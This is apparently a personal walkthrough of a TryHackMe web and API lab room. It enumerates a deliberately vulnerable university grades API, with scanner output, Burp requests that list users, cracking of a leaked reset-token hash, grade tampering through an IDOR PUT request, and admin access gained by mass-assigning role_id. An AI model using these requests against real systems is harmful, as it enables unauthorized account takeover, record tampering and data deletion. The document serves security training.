----
API and Web testing room
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/6a9730b73744a7e6af162994e74b2191.jpeg)

### Enroll today in Generic University

 Start Machine

Generic University is an old, prestigious university with a long history dating back to 1066 where it was initially a training program for sheep dogs. Now it's a modern university with an old look. Our classes are very difficult and we aim to stress students out, very few of them pass their courses, but a grade higher than 90% is unheard of in our history. As the motto says "Inflict Pain"

Answer the questions below

```json
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.58.242 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.58.242:22
Open 10.10.58.242:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-17 13:20 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:20
Completed NSE at 13:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:20
Completed Parallel DNS resolution of 1 host. at 13:20, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:20
Scanning 10.10.58.242 [2 ports]
Discovered open port 22/tcp on 10.10.58.242
Discovered open port 80/tcp on 10.10.58.242
Completed Connect Scan at 13:20, 0.24s elapsed (2 total ports)
Initiating Service scan at 13:20
Scanning 2 services on 10.10.58.242
Completed Service scan at 13:21, 17.09s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.58.242.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:21
NSE Timing: About 99.29% done; ETC: 13:21 (0:00:00 remaining)
Completed NSE at 13:21, 33.39s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 1.92s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Nmap scan report for 10.10.58.242
Host is up, received user-set (0.24s latency).
Scanned at 2023-03-17 13:20:45 EDT for 53s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 70121d390ed67fc141b548eb0b2edd09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoHAMCthJ4cP3O4erJuzYHPuzoQ9LOXObM/o5CQC3y5X/OcuTtAv2fujHQmn4odx9o5kUhB86cSXbykcwEPwFSxEYaYJ7ik+eQGt5idB3aUNBKkrl4nD8r6mdO2WQAxrrG9+9DVfN1XEAA/5g0rYlg9JdNlWFaaIKJOswF0dVBr+MGJr1Lre8fWI+t+f9piJYBkBh1N4FVnnYpP5W+PBqfYZ2XXT3u7x3Rt/SHFGXXXFQFcdDU1q5LSZuK/fvkrZS6uSQG0q+k3l/NKOa+m4nfw1IoxZXdztSbv4zKYJaCt8ICdtuOZuYjSlpGTeXvh3yvRNE3VVO3ZDa830ljic51
|   256 1bcd140ff67da0340dc07e3dff3458bc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEWW7wBgUUGJbtH8Nkovb7w5U6+Kfqzq6B1Ln1+TKfyfyVDOr1aXAHxfKwquqE/eElaXWdoNrT3VfCgkVT+wfqk=
|   256 b6732ab30c7e4dd4eb192f9cf79047e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjrAQrvcGMb/vv+0Z5glOipNR+h1cSHZw7R2ZP2nc8P
80/tcp open  http    syn-ack Apache httpd 2.4.29
|_http-title: Generic University - View your Grades
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.53 seconds

```

What is the Generic University motto?

*Lorem Ipsum*

### Basic Recon

The API is currently in development and many of the API endpoints aren't publically accessible, use basic recon to find these hidden endpoints. Bare in mind this is a RESTful API.

Answer the questions below

```

using burp intruder

REQUEST

GET /api/users/§0§ HTTP/1.1  (from 0 to 99 and found from 1 to 7 users)

RESPONSE

HTTP/1.1 200 OK

Date: Fri, 17 Mar 2023 17:32:34 GMT

Server: Apache/2.4.29 (Ubuntu)

Cache-Control: no-cache, private

Set-Cookie: XSRF-TOKEN=eyJp...3D; expires=Fri, 17-Mar-2023 19:32:39 GMT; Max-Age=7200; path=/; samesite=lax

Set-Cookie: laravel_session=ey...; expires=Fri, 17-Mar-2023 19:32:39 GMT; Max-Age=7200; path=/; httponly; samesite=lax

Content-Length: 191

Connection: close

Content-Type: application/json

users:

{"id":1,"name":"Javon Moen","email":"johnathon71@rolfson.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":2,"name":"Barbara Bauch","email":"pabshire@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":3,"name":"Muriel Mante","email":"jgerlach@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":4,"name":"Jalon Fisher","email":"tmiller@hotmail.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":5,"name":"Taya Kohler","email":"hspinka@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}

{"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1}

{"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}


now login

johnathon71@rolfson.com

forgot ur pass 

If i send to same email to get reset link
johnathon71@rolfson.com

gives me some error

Swift_TransportException
Connection could not be established with host smtp.mailtrap.io :stream_socket_client(): unable to connect to smtp.mailtrap.io:2525 (Connection timed out)
http://10.10.58.242/password/email 

Query

Query

    select
      *
    from
      `users`
    where
      `email` = ?
    limit
      1

Time
    157.88 
Connection name
    mysql 
0
    johnathon71@rolfson.com 

Query

Query

    select
      *
    from
      `password_resets`
    where
      `email` = ?
    limit
      1

Time
    319.75 
Connection name
    mysql 
0
    johnathon71@rolfson.com 

Query

Query

    delete from
      `password_resets`
    where
      `email` = ?

Time
    159.99 
Connection name
    mysql 
0
    johnathon71@rolfson.com 

Query

Query

    insert into
      `password_resets` (`email`, `token`, `created_at`)
    values
      (?, ?, ?)

Time
    154.41 
Connection name
    mysql 
0
    johnathon71@rolfson.com 
1
    $2y$10$/SIDNpN/lcL2Ow5fdH8BAefBj5BQDfhC7z.6lVD2/w.TKYTpUYVry 
2
    2023-03-17T17:34:56.306134Z 

now can see the pass

$2y$10$/SIDNpN/lcL2Ow5fdH8BAefBj5BQDfhC7z.6lVD2/w.TKYTpUYVry  (bcrypt 3200)

┌──(witty㉿kali)-[/tmp]
└─$ cat hash
$2y$10$/SIDNpN/lcL2Ow5fdH8BAefBj5BQDfhC7z.6lVD2/w.TKYTpUYVry

using hashcat

...

┌──(witty㉿kali)-[/tmp]
└─$ hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

and wait...

https://github.com/InsiderPhD/Generic-University/blob/master/routes/web.php

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster dir -e -k -u http://10.10.58.242/api -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.58.242/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/17 15:58:18 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.58.242/api/admin                (Status: 302) [Size: 346] [--> http://10.10.58.242/login]
http://10.10.58.242/api/cgi-bin/             (Status: 301) [Size: 317] [--> http://10.10.58.242/api/cgi-bin]
http://10.10.58.242/api/classes              (Status: 500) [Size: 623308]
http://10.10.58.242/api/roles                (Status: 500) [Size: 623270]
http://10.10.58.242/api/user                 (Status: 302) [Size: 346] [--> http://10.10.58.242/login]
http://10.10.58.242/api/users                (Status: 500) [Size: 623270]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/17 16:01:40 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ cat /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt | grep -n grades     
4376:upgrades
18869:grades
116135:upgradestep1

┌──(witty㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://10.10.58.242/api/FUZZ -t 10 -timeout 30 -X PUT

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : PUT
 :: URL              : http://10.10.58.242/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 30
 :: Threads          : 10
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 405, Size: 558375, Words: 23393, Lines: 158, Duration: 301ms]
    * FUZZ: admin
[Status: 405, Size: 558374, Words: 23393, Lines: 158, Duration: 273ms]
    * FUZZ: user
[Status: 405, Size: 558407, Words: 23398, Lines: 158, Duration: 228ms]
    * FUZZ: classes
[Status: 405, Size: 558405, Words: 23398, Lines: 158, Duration: 255ms]
    * FUZZ: users
[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 195ms]
    * FUZZ: .
[Status: 405, Size: 558406, Words: 23398, Lines: 158, Duration: 236ms]
    * FUZZ: grades
[Status: 405, Size: 558405, Words: 23398, Lines: 158, Duration: 237ms]
    * FUZZ: roles

PUT /api/grades HTTP/1.1

HTTP/1.0 405 Method Not Allowed

SQLSTATE[HY000] [2002] Connection refused (SQL: select * from `grades` where `user_id` is null) 

PUT /api/grades/1 HTTP/1.1

{"id":1,"grade":6,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":1}

PUT /api/grades/2 HTTP/1.1

{"id":2,"grade":28,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":2}

PUT /api/grades/3 HTTP/1.1

{"id":3,"grade":15,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":3}

PUT /api/grades/4 HTTP/1.1

{"id":4,"grade":55,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":4}

PUT /api/grades/5 HTTP/1.1

{"id":5,"grade":3,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":1,"uni_class_id":5}

PUT /api/grades/6 HTTP/1.1

{"id":6,"grade":7,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":2,"uni_class_id":1}

PUT /api/grades/7 HTTP/1.1

{"id":7,"grade":40,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":2,"uni_class_id":2}

PUT /api/grades/8 HTTP/1.1

{"id":8,"grade":30,"comments":"Good job!","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":2,"uni_class_id":3}

and now my new user will get 1000 :)

PUT /api/grades/12 HTTP/1.1

grade=1000&comments=1337 :)

{"id":12,"grade":"1000","comments":"1337 :)","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2023-03-17T21:27:34.000000Z","user_id":3,"uni_class_id":2}


```

![[Pasted image 20230317124824.png]]

What API endpoint may allow someone to edit a grade?

Syntax: [Method] [URL] eg GET /some/route

*PUT /api/grades*

What API endpoint shows all individuals holding accounts?

*GET /api/users*

What API endpoint shows all the possible courses on Generic University?

*GET /api/classes*


### Get an account

Now we have done some basic recon, we will need an account for further testing, can you register an account?

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster dir -e -k -u http://10.10.58.242 -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.58.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/17 14:39:12 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.58.242/.hta                 (Status: 403) [Size: 277]
http://10.10.58.242/.htaccess            (Status: 403) [Size: 277]
http://10.10.58.242/.htpasswd            (Status: 403) [Size: 277]
http://10.10.58.242/admin                (Status: 200) [Size: 117]
http://10.10.58.242/cgi-bin/             (Status: 301) [Size: 313] [--> http://10.10.58.242/cgi-bin]
http://10.10.58.242/contact              (Status: 200) [Size: 4462]
http://10.10.58.242/favicon.ico          (Status: 200) [Size: 0]
http://10.10.58.242/home                 (Status: 200) [Size: 3584]
http://10.10.58.242/images               (Status: 301) [Size: 313] [--> http://10.10.58.242/images/]
http://10.10.58.242/index.php            (Status: 200) [Size: 3634]
http://10.10.58.242/login                (Status: 200) [Size: 5645]
http://10.10.58.242/logout               (Status: 405) [Size: 558291]
http://10.10.58.242/register             (Status: 200) [Size: 5712]
http://10.10.58.242/robots.txt           (Status: 200) [Size: 24]
http://10.10.58.242/server-status        (Status: 403) [Size: 277]
http://10.10.58.242/web.config           (Status: 200) [Size: 1194]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/17 14:42:29 Finished
===============================================================



http://10.10.106.64/api/users

[{"id":1,"name":"Javon Moen","email":"johnathon71@rolfson.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":2,"name":"Barbara Bauch","email":"pabshire@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":3,"name":"Muriel Mante","email":"jgerlach@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":4,"name":"Jalon Fisher","email":"tmiller@hotmail.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":5,"name":"Taya Kohler","email":"hspinka@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1},{"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}]

Using burp

Request
POST /api/users HTTP/1.1

Response
Illuminate\Database\QueryException: SQLSTATE[HY000]: General error: 1364 Field 'name' doesn't have a default value (SQL: insert into `users` (`role_id`, `updated_at`, `created_at`) values (2, 2023-03-17 20:49:34, 2023-03-17 20:49:34)) in file /var/www/html/Generic-University/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 671

so need field name

POST /api/users HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
name=witty

Illuminate\Database\QueryException: SQLSTATE[HY000]: General error: 1364 Field 'email' doesn't have a default value (SQL: insert into `users` (`role_id`, `name`, `updated_at`, `created_at`) values (2, witty, 2023-03-17 20:56:39, 2023-03-17 20:56:39)) in file /var/www/html/Generic-University/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 671

Now email field

name=witty&email=witty@gmail.com

Illuminate\Database\QueryException: SQLSTATE[HY000]: General error: 1364 Field 'password' doesn't have a default value (SQL: insert into `users` (`role_id`, `name`, `email`, `updated_at`, `created_at`) values (2, witty, witty@gmail.com, 2023-03-17 20:58:05, 2023-03-17 20:58:05)) in file /var/www/html/Generic-University/vendor/laravel/framework/src/Illuminate/Database/Connection.php on line 671

and a pass

name=witty&email=witty@gmail.com&password=witty

HTTP/1.1 201 Created

{"role_id":2,"name":"witty","email":"witty@gmail.com","updated_at":"2023-03-17T20:58:44.000000Z","created_at":"2023-03-17T20:58:44.000000Z","id":8}

name=witty1&email=witty1@gmail.com&password=witty&role_id=1

{"role_id":"1","name":"witty1","email":"witty1@gmail.com","updated_at":"2023-03-17T21:02:45.000000Z","created_at":"2023-03-17T21:02:45.000000Z","id":10}

cannot login, after pressing reset pass (error 500)

so role_id=1  means admin cz at the time to create a new user, for default create with role_id=2
```

What endpoint lets you create an account?

*GET /register/*

What other endpoint lets you create an account?

*POST /api/users/*

Why doesn't this work?

syntax: [action] [function]

reset [function]

*reset password*

### Becoming an admin

*Hacker Noises*, we're in, but what next?

Answer the questions below

```
http://10.10.106.64/admin

Welcome to the admin dashboard

Security Vulnerabilities

http://10.10.106.64/admin/security

vuln: Information disclosure of grades

vuln: Information disclosure of grades

vuln: IDOR on most endpoints

vuln: IDOR on most endpoints


GET /api/admin HTTP/1.1

[{"endpoint":"\/","desc":"Shows this manual"},{"endpoint":"restore","desc":"Restores the database from last manual backup"},{"endpoint":"delete","desc":"deletes everything from the database NO BACKUP"}]


```

What is the role ID for the Admin role?

*1*

What HTTP request method allows you to change a user?

*PUT*

### Admin Panels

Answer the questions below

```
GET /api/admin/restore HTTP/1.1

permission required :(

GET /api/admin/delete HTTP/1.1

permission required :(

using burp

POST /register HTTP/1.1

_token=k..&name=w&email=w%40gmail.com&password=TSsMwEwRWWb6YDa&password_confirmation=TSsMwEwRWWb6YDa&role_id=1


```

What is the path of the first admin panel (security vulnerabilities)?

*/admin/*

What is the path of the second admin panel (delete and restore)?  

*/api/admin*

What is the request that deletes all the data format: [HTTP method] [path]

*GET /api/admin/delete*


[[hackerNote]]